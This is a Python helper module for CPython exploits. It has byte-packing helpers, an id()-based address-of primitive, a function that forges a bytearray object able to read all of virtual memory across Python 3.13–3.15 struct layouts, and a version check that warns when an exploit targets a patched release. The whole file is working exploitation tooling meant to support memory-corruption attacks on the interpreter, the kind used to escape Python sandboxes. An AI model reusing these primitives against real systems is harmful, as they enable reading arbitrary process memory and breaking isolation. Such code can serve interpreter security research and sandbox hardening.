import sys

# versioning helpers to emit warnings if the user tries to run an exploit on a patched
# version or to help emit different structs depending on running pyver
PYVER = tuple(sys.version_info)[:3]
IS_LT_313 = PYVER[:2] < (3, 13)
IS_PY313 = PYVER[:2] == (3, 13)
IS_PY314 = PYVER[:2] == (3, 14)
IS_PY315 = PYVER[:2] == (3, 15)
BYTEORDER = sys.byteorder

PTR_SIZE = tuple.__itemsize__
MAX_SIGNED_LONG = 2 ** (PTR_SIZE * 8 - 1) - 1

# packing/conversion stuff
p64 = lambda num: num.to_bytes(8, BYTEORDER)
p32 = lambda num: num.to_bytes(4, BYTEORDER)
p16 = lambda num: num.to_bytes(2, BYTEORDER)
p8 = lambda num: num.to_bytes(1, BYTEORDER)
i2f = lambda num: 5e-324 * num
p_long = {4: p32, 8: p64}[PTR_SIZE]

def addrof_bytes(obj: bytes):
    """
    Returns the address of the actual bytes buffer. Used for making fake objects.
    
    :param obj: bytes object to get the ob_bytes address of
    :type obj: bytes
    """
    assert type(obj) is bytes
    return id(obj) + bytes.__basicsize__ - 1

def evil_bytearray_obj(add_metadata: bool=False) -> tuple[bytes, int]:
    """
    Generates the data for a bytearray object that can read all of virtual memory.
    
    :param add_metadata: Whether to add the metadata for the GC to this object
    :type add_metadata: bool
    :return: (bytes object with fake object data, address of the buffer in memory)
    :rtype: tuple[bytes, int]
    """

    if IS_PY315:
        # A backing bytes object was added to the struct in 3.15 to make creating bytes objects from bytearray objects faster.
        # It isn't used unless you convert this object to a bytes object (which you shouldn't do in the first place),
        # so we can safely set it to 0
        fake_obj = (
            (p_long(0) * 2 if add_metadata else b"") +
            p_long(0x12345) +         # Py_ssize_t ob_refcnt     
            p_long(id(bytearray)) +   # PyTypeObject *ob_type
            p_long(MAX_SIGNED_LONG) + # Py_ssize_t ob_size
            p_long(MAX_SIGNED_LONG) + # Py_ssize_t ob_alloc
            p_long(0) +               # char *ob_bytes
            p_long(0) +               # char *ob_start
            p_long(0) +               # Py_ssize_t ob_exports
            p_long(0)                 # PyObject *ob_bytes_object
        )
        
        # (data, address of data) 
        return fake_obj, addrof_bytes(fake_obj)
    else:
        # This is a bytearray object that can read all of virtual memory (ob_start of 0 and ob_size of MAX_SIGNED_LONG)
        fake_obj = (
            (p_long(0) * 2 if add_metadata else b"") +
            p_long(0x12345) +         # Py_ssize_t ob_refcnt     
            p_long(id(bytearray)) +   # PyTypeObject *ob_type
            p_long(MAX_SIGNED_LONG) + # Py_ssize_t ob_size
            p_long(MAX_SIGNED_LONG) + # Py_ssize_t ob_alloc
            p_long(0) +               # char *ob_bytes
            p_long(0) +               # char *ob_start
            p_long(0)                 # Py_ssize_t ob_exports
        )
        
        # (data, address of data) 
        return fake_obj, addrof_bytes(fake_obj)

def check_pyversion(*, patched_ver: tuple[int]=None, introduced_ver: tuple[int]=None) -> None:
    """
    Helper function to print a warning message if a user tries running an exploit on a version the
    exploit does not work in.
    
    :param patched_ver: The version the bug was patched in
    :type patched_ver: tuple[int]
    :param introduced_ver: The version the bug was introduced in
    :type introduced_ver: tuple[int]
    """
    
    if patched_ver is None and introduced_ver is None:
        raise ValueError("patched_ver and introduced_ver can't both be None")

    cur_ver_str = "v" + ".".join(map(str, PYVER))
    if patched_ver is not None and PYVER >= patched_ver:
        patched_ver_str = "v" + ".".join(map(str, patched_ver))
        print(f"[!] This exploit was patched in {patched_ver_str}, you're on {cur_ver_str} so the exploit will likely not work.")
        print()
    elif introduced_ver is not None and PYVER < introduced_ver:
        introduced_ver_str = "v" + ".".join(map(str, introduced_ver))
        print(f"[!] This exploit was first introduced in {introduced_ver_str}, you're on {cur_ver_str} so the exploit will likely not work.")
        print()